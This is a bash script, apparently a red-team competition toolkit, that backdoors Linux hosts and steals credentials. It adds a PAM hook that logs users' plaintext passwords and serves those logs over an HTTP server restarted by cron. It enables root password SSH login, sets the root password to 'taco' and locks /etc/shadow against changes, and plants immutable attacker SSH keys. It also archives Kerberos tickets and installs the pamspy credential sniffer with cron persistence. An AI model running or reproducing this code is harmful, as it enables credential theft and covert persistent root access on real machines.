#!/bin/bash
echo 'deployes a PAM.d sniffer'
echo
echo "sniffing from PAM.d/common-auth"
echo "auth      optional        pam_exec.so     quiet   expose_authtok  /opt/secdump.sh" >> /etc/pam.d/common-auth
echo "done with that"
echo "creating script"
echo '#!/bin/sh' > /opt/secdump.sh
echo 'echo "$(date +%Y-%m-%d_%H:%M:%S)  $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log' >> /opt/secdump.sh
echo "done with that"
echo "making executable"
chmod +x /opt/secdump.sh
echo "done with that"
echo "writing PyLogWeb"
echo '#!/bin/bash' > /opt/pylogweb.sh
echo 'cd /var/log' >> /opt/pylogweb.sh
echo 'python3 -m http.server 12454' >> /opt/pylogweb.sh
chmod +x /opt/pylogweb.sh
echo "backing up crontab and adding fun"
crontab -l > /tmp/rootcrontab
echo '*/5 * * * * /opt/pylogweb.sh' >> /tmp/rootcrontab
crontab -i /tmp/rootcrontab
echo "fun installed"
echo
echo "done done - enjoy!"
echo
#EOF
# wipe any existing SSH config in the proper folder
rm -rf /etc/ssh/sshd_config.d/*.conf
# permit root login using password and/or pubkey
echo "PermitRootLogin yes" > /etc/ssh/sshd_config.d/custom.conf
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config.d/custom.conf
echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config.d/custom.conf
service sshd restart
# change root password to "taco" - added without (re-)testing 2024-07-07
# via: https://stackoverflow.com/questions/43953323/change-user-password-with-one-bash-command-line
echo 'root:taco' | chpasswd
# make shadow file immutable so they can't change password(s) back
chattr +i /etc/shadow
# add root pubkey:
mkdir /root/.ssh
chattr -i /root/.ssh/authorized_keys
echo "ssh-rsa  mejaredbrees" >> /root/.ssh/authorized_keys
echo "ssh-rsa  mejaredbrees" >> /root/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMD5Li0NCTgn+mcLm1tsalG7c5a6coivsJ320+BCXI8u mejaredbrees" >> /root/.ssh/authorized_keys
echo "ssh-rsa  dabailey@kali-tp" >> /root/.ssh/authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHentSBOZcIgzYHvKZh9oyZQX83XQGb1/bbzgqgH2Q2 dabailey@kali-tp" >> /root/.ssh/authorized_keys
echo "" >> /root/.ssh/authorized_keys
echo "" >> /root/.ssh/authorized_keys
echo "" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
chattr +i /root/.ssh/authorized_keys
chattr +i /etc/ssh/sshd_config.d/custom.conf
chattr +i /etc/pam.d/common-auth
echo "stealing KRB stuff"
tar -czvf /root/krb.tgz /tmp/krb*
#from here:
#https://github.com/citronneur/pamspy
# base64-encoded tgz containing binary;
# is expanded, set as executable, and run.
# adds to cron to persist.
# since it's using default values (and in this repo),
# it should be relatively easy for the Blue Teams to find/identify

# tested and working on Fedora Workstation 40 2024-10-25 with... not many updates

## the magic:
# base64 decode
echo "" | base64 -d > /tmp/ps.tgz
# decompress:
tar -xzvf /tmp/ps.tgz -C /bin/

## the foundations:
# make executable
chmod +x /bin/pamspy
# initialize the creds file so we can change permissions
touch /tmp/credentials
# allow everyone to have a look
chmod 644 /tmp/credentials

## going the extra mile:
# wrapper script:
# needs 3 echos because of single-quotes in command we are echo-ing...
echo '#!/bin/sh' > /bin/pscript.sh
echo -n '/bin/pamspy -p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' >> /bin/pscript.sh
echo -n "' '" >> /bin/pscript.sh
echo ' -f4) -d /tmp/credentials' >> /bin/pscript.sh
echo 'touch /tmp/credentials' >> /bin/pscript.sh
echo 'chmod 644 /tmp/credentials' >> /bin/pscript.sh
chmod +x /bin/pscript.sh
# crontab:
echo '*/5 * * * * /bin/pscript.sh' > /tmp/crontab-for-root.txt
crontab -i /tmp/crontab-for-root.txt
rm /tmp/crontab-for-root.txt

## and.... execute now!
/bin/pscript.sh

clear
echo "done pwning!"
echo
